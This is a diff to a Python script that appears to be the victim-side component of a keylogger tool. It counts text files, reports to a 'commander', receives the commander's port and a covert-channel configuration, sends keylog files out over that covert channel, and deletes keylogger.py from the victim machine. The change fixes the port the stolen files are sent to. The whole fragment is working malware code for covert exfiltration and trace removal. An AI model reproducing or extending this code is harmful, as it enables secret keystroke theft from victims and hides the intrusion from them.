@@ -135,11 +135,11 @@ if __name__ == '__main__':
                     if txt_files:
                         # Send response and number of files to commander
                         print(constants.SEARCH_FILES_SUCCESSFUL_MSG.format(len(txt_files)))
-                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files))
-                                           + "/" + str(len(txt_files)).encode())
+                        client_socket.send(constants.SEARCH_FILES_SUCCESSFUL_SEND.format(len(txt_files),
+                                                                                         len(txt_files)).encode())
 
-                        # WAIT FOR ACK
-                        client_socket.recv(200)
+                        # Receive Actual Commander Port
+                        cmdr_port = client_socket.recv(200).decode()
 
                         # Send file(s) in current directory
                         for file_name in txt_files:
@@ -150,7 +150,7 @@ if __name__ == '__main__':
                             # Receive Covert Channel Config
                             header, field = client_socket.recv(200).decode().split("/")
 
-                            transfer_keylog_file_covert(client_socket, client_address[0], client_address[1],
+                            transfer_keylog_file_covert(client_socket, client_address[0], int(cmdr_port),
                                                         source_port, (header, field), file_name)
 
                         # Delete keylogger.py from client/victim
